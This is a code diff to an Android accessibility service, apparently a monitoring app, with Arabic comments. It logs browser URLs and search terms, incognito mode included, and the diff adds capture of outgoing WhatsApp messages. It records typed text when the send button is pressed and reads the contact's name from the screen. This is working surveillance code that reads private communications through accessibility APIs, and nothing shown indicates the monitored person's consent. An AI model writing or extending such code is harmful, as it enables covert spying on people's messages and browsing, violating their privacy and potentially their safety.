@@ -9,13 +9,19 @@ import android.view.accessibility.AccessibilityNodeInfo
 import org.json.JSONObject
 
 /**
- * رصد التصفح والبحث من شريط العنوان في أي متصفح (الوضع العادي والخفي).
+ * رصد التصفح والبحث من شريط العنوان في أي متصفح (الوضع العادي والخفي)
+ * + رصد رسائل واتساب الصادرة (ضغط زر الإرسال).
  *
- * آلية العمل الصحيحة:
+ * آلية عمل المتصفحات:
  *  1) عند أي تغيير نافذة/محتوى في متصفح: نؤجل القراءة 600 مللي (حتى يستقر شريط العنوان).
  *  2) نقرأ شجرة الواجهة ونبحث عن شريط العنوان نفسه (حقل url_bar في كروم، location_bar في سامسونج...).
  *  3) نتحقق أن النص رابط حقيقي أو نص بحث، ونستبعد صفحات النظام الداخلية (chrome:// ...).
  *  4) إذا كان رابط بحث (google/bing/...) نستخرج كلمة البحث من المعامل q ونحفظ الرابط معًا.
+ *
+ * آلية عمل واتساب (الصادرة):
+ *  1) أثناء الكتابة نحفظ نص حقل الكتابة (TYPE_VIEW_TEXT_CHANGED).
+ *  2) عند الضغط على زر «إرسال» (TYPE_VIEW_CLICKED ووصفه يحتوي إرسال/send)
+ *     نسجل الرسالة كحدث صادر مع اسم المحادثة إن أمكن قراءته من شريط العنوان.
  */
 class UrlAccessibilityService : AccessibilityService() {
 
@@ -34,8 +40,22 @@ class UrlAccessibilityService : AccessibilityService() {
         private val ADDRESS_ID_HINTS = listOf("url", "address", "location", "search_box", "searchbox", "omnibox")
         private val INCOGNITO_HINTS = listOf("incognito", "خفي", "تخفي", "private browsing", "تصفح خاص")
 
+        // ---------- رصد الصادرة في واتساب ----------
+        /** أوصاف زر الإرسال المعروفة (عربي/إنجليزي وكل نسخ واتساب) */
+        private val SEND_HINTS = listOf("إرسال", "ارسال", "send", "إرسال الرسالة")
+        /** معرفات واجهة واتساب التي تحمل اسم صاحب المحادثة */
+        private val CHAT_NAME_ID_HINTS = listOf(
+            "conversation_title", "conversation_contact", "toolbar_title", "contact_name", "chat_title"
+        )
+
         private var lastUrl = ""
         private var lastAt = 0L
+
+        // حالة الصادرة
+        private var composingText = ""
+        private var lastSentText = ""
+        private var lastSentAt = 0L
+        private var lastChatName = ""
     }
 
     private val handler = Handler(Looper.getMainLooper())
@@ -44,6 +64,11 @@ class UrlAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
         val pkg = event.packageName?.toString() ?: return
+        // رسائل واتساب الصادرة (ضغط زر الإرسال) — تُرصد هنا لأنها لا تصدر إشعارًا
+        if (Config.isWhatsApp(pkg)) {
+            handleWhatsAppEvent(pkg, event)
+            return
+        }
         if (!Config.isBrowser(pkg)) return
         val t = event.eventType
         if (t != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
@@ -53,6 +78,86 @@ class UrlAccessibilityService : AccessibilityService() {
         // تأجيل القراءة حتى يستقر شريط العنوان (الكتابة الحرفية تُصدر عشرات الأحداث)
         handler.removeCallbacks(capture)
         handler.postDelayed(capture, 600)
+    }
+
+    // ---------- رصد رسائل واتساب الصادرة ----------
+
+    private fun handleWhatsAppEvent(pkg: String, event: AccessibilityEvent) {
+        when (event.eventType) {
+            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                // الكتابة في حقل الرسالة — نحفظ النص الحالي حتى لحظة الضغط على إرسال
+                val src = event.source
+                val isEdit = src?.className?.toString()?.contains("EditText") == true ||
+                    event.className?.toString()?.contains("EditText") == true
+                if (!isEdit) return
+                val txt = src?.text?.toString() ?: event.text?.joinToString("") ?: ""
+                if (txt.isNotEmpty() && txt.length <= 500) composingText = txt
+            }
+
+            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
+                val desc = event.source?.contentDescription?.toString()
+                    ?: event.contentDescription?.toString() ?: ""
+                // زر الإرسال: وصفه القصير يحتوي كلمة إرسال/send
+                if (desc.isEmpty() || desc.length > 40) return
+                if (SEND_HINTS.none { desc.contains(it, ignoreCase = true) }) return
+
+                val text = composingText.trim()
+                if (text.isEmpty()) return
+                // منع تسجيل الرسالة نفسها مرتين (واتساب قد يصدر حدثي ضغط متتاليين)
+                val now = System.currentTimeMillis()
+                if (text == lastSentText && now - lastSentAt < 4_000) return
+                lastSentText = text
+                lastSentAt = now
+
+                // اسم صاحب المحادثة الحالي (أفضل محاولة)
+                readChatName().takeIf { it.isNotBlank() }?.let { lastChatName = it }
+
+                val json = org.json.JSONObject()
+                    .put("type", "WHATSAPP")
+                    .put("direction", "OUTGOING")
+                    .put("title", lastChatName.ifBlank { "رسالة صادرة" })
+                    .put("app", whatsAppName(pkg))
+                    .put("packageName", pkg)
+                    .put("meta", org.json.JSONObject().put("text", text))
+                EventStore.addEvent(applicationContext, json)
+                composingText = ""
+            }
+
+            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+                // فتح محادثة جديدة — حدّث اسم المحادثة الحالية
+                readChatName().takeIf { it.isNotBlank() }?.let { lastChatName = it }
+            }
+        }
+    }
+
+    /** محاولة قراءة اسم صاحب المحادثة من شريط العنوان في واتساب */
+    private fun readChatName(): String {
+        try {
+            val root = rootInActiveWindow ?: return ""
+            val stack = ArrayDeque<AccessibilityNodeInfo>()
+            stack.add(root)
+            var n = 0
+            while (stack.isNotEmpty() && n < 250) {
+                val node = stack.removeFirst()
+                n++
+                val id = node.viewIdResourceName?.lowercase() ?: ""
+                val cls = node.className?.toString() ?: ""
+                val txt = node.text?.toString()?.trim() ?: ""
+                if (txt.isNotBlank() && txt.length <= 60 && cls.contains("TextView") &&
+                    CHAT_NAME_ID_HINTS.any { id.contains(it) }
+                ) {
+                    return txt
+                }
+                for (i in 0 until node.childCount) node.getChild(i)?.let { stack.add(it) }
+            }
+        } catch (_: Exception) {}
+        return ""
+    }
+
+    private fun whatsAppName(pkg: String): String = when (pkg.lowercase()) {
+        "com.whatsapp" -> "WhatsApp"
+        "com.whatsapp.w4b" -> "WhatsApp Business"
+        else -> if (pkg.contains("gb", true)) "GBWhatsApp" else "WhatsApp"
     }
 
     override fun onInterrupt() {}
